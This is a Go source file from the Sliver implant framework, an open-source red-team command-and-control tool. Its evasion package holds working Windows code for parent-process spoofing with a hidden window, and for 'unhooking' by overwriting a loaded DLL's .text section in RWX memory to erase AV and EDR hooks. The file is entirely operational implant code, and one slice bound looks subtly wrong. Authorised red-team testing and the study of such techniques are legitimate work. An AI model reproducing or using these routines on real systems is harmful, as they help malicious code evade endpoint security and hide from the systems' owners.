package evasion

/*
	Sliver Implant Framework
	Copyright (C) 2021  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"github.com/bishopfox/sliver/implant/sliver/syscalls"
	"golang.org/x/sys/windows"

	//{{if .Config.Debug}}
	"log"
	//{{end}}
	"debug/pe"
	"io/ioutil"
	"os/exec"
	"unsafe"
)

func SpoofParent(ppid uint32, prog string, args string) (*windows.ProcessInformation, error) {
	parentHandle, err := windows.OpenProcess(windows.PROCESS_CREATE_PROCESS, false, ppid)
	if err != nil {
		//{{if .Config.Debug}}
		log.Printf("OpenProcess failed: %v\n", err)
		//{{end}}
		return nil, err
	}
	var procThreadAttributeSize uintptr
	if err = syscalls.InitializeProcThreadAttributeList(nil, 1, 0, &procThreadAttributeSize); err != nil && err != windows.E_NOT_SUFFICIENT_BUFFER {
		//{{if .Config.Debug}}
		log.Printf("InitializeProcThreadAttributeList - first call failed: %v\n", err)
		//{{end}}
		return nil, err
	}
	procHeap, err := syscalls.GetProcessHeap()
	if err != nil {
		//{{if .Config.Debug}}
		log.Printf("GetProcessHeap failed: %v\n", err)
		//{{end}}
		return nil, err
	}
	attributeList, err := syscalls.HeapAlloc(procHeap, 0, procThreadAttributeSize)
	if err != nil {
		//{{if .Config.Debug}}
		log.Printf("HeapAlloc failed: %v\n", err)
		//{{end}}
		return nil, err
	}
	defer syscalls.HeapFree(procHeap, 0, attributeList)
	var startupInfo syscalls.StartupInfoEx
	startupInfo.AttributeList = (*syscalls.PROC_THREAD_ATTRIBUTE_LIST)(unsafe.Pointer(attributeList))
	if err = syscalls.InitializeProcThreadAttributeList(startupInfo.AttributeList, 1, 0, &procThreadAttributeSize); err != nil {
		//{{if .Config.Debug}}
		log.Printf("InitializeProcThreadAttributeList - second call failed: %v\n", err)
		//{{end}}
		return nil, err
	}

	defer syscalls.DeleteProcThreadAttributeList(startupInfo.AttributeList)
	uintParentHandle := uintptr(parentHandle)
	if err = syscalls.UpdateProcThreadAttribute(startupInfo.AttributeList, 0, syscalls.PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &uintParentHandle, unsafe.Sizeof(parentHandle), 0, nil); err != nil {
		//{{if .Config.Debug}}
		log.Printf("UpdateProcThreadAttribute failed: %v\n", err)
		//{{end}}
		return nil, err
	}

	// get program path as a UTF string
	programPath, err := exec.LookPath(prog)
	if err != nil {
		//{{if .Config.Debug}}
		log.Printf("LookPath failed: %v\n", err)
		//{{end}}
		return nil, err
	}
	utfProgramPath, err := windows.UTF16PtrFromString(programPath)
	if err != nil {
		//{{if .Config.Debug}}
		log.Printf("UTF16PtrFromString failed: %v\n", err)
		//{{end}}
		return nil, err
	}

	// start a process of the specified program name, spoofing the parent
	var procInfo windows.ProcessInformation
	startupInfo.Cb = uint32(unsafe.Sizeof(startupInfo))
	startupInfo.Flags |= windows.STARTF_USESHOWWINDOW
	startupInfo.ShowWindow = windows.SW_HIDE
	// creationFlags := windows.CREATE_SUSPENDED | windows.CREATE_NO_WINDOW | windows.EXTENDED_STARTUPINFO_PRESENT
	creationFlags := windows.CREATE_NO_WINDOW | windows.EXTENDED_STARTUPINFO_PRESENT
	if err = syscalls.CreateProcess(utfProgramPath, nil, nil, nil, true, uint32(creationFlags), nil, nil, &startupInfo, &procInfo); err != nil {
		//{{if .Config.Debug}}
		log.Printf("CreateProcess failed: %v\n", err)
		//{{end}}
		return nil, err
	}
	return &procInfo, nil
}

// RefreshPE reloads a DLL from disk into the current process
// in an attempt to erase AV or EDR hooks placed at runtime.
func RefreshPE(name string) error {
	//{{if .Config.Debug}}
	log.Printf("Reloading %s...\n", name)
	//{{end}}
	df, e := ioutil.ReadFile(name)
	if e != nil {
		return e
	}
	f, e := pe.Open(name)
	if e != nil {
		return e
	}

	x := f.Section(".text")
	ddf := df[x.Offset:x.Size]
	return writeGoodBytes(ddf, name, x.VirtualAddress, x.Name, x.VirtualSize)
}

func writeGoodBytes(b []byte, pn string, virtualoffset uint32, secname string, vsize uint32) error {
	t, e := windows.LoadDLL(pn)
	if e != nil {
		return e
	}
	h := t.Handle
	dllBase := uintptr(h)

	dllOffset := uint(dllBase) + uint(virtualoffset)

	var old uint32
	e = windows.VirtualProtect(uintptr(dllOffset), uintptr(len(b)), windows.PAGE_EXECUTE_READWRITE, &old)
	if e != nil {
		return e
	}
	//{{if .Config.Debug}}
	log.Println("Made memory map RWX")
	//{{end}}

	for i := 0; i < len(b); i++ {
		loc := uintptr(dllOffset + uint(i))
		mem := (*[1]byte)(unsafe.Pointer(loc))
		(*mem)[0] = b[i]
	}

	//{{if .Config.Debug}}
	log.Println("DLL overwritten")
	//{{end}}
	e = windows.VirtualProtect(uintptr(dllOffset), uintptr(len(b)), old, &old)
	if e != nil {
		return e
	}
	//{{if .Config.Debug}}
	log.Println("Restored memory map permissions")
	//{{end}}
	return nil
}
